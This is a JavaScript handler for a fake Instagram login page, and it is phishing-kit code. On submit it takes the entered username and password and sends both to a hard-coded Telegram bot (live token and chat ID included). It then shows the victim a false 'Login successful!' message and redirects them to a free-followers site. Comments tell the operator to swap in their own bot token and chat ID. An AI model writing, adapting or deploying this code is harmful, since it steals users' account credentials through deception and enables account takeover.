
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); 

    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();

    if (!username || !password) {
        alert("Please enter username and password.");
        return;
    }

    // Replace with your Telegram Bot Token
    const botToken = "7887583841:AAFaOn7C_SpIM9sHw3dR--loFhuMHRa7sUA";  
    // Replace with your Chat ID (Get it using @userinfobot on Telegram)
    const chatId = "7919654013";  

    // Message format
    let message = `🔐 *Instagram Login Attempt* 🔐\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}`;

    // Telegram API URL
    let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Sending request
    fetch(telegramURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert("Login successful!");
            window.location.href = "https://superviral.io/free-instagram-followers/"; // Change this to your actual next page URL
        } else {
            alert("Error sending data to Telegram. Check bot token and chat ID.");
            console.error("Telegram API Error:", data);
        }
    })
    .catch(error => {
        alert("Network error. Check console for details.");
        console.error("Fetch Error:", error);
    });
});
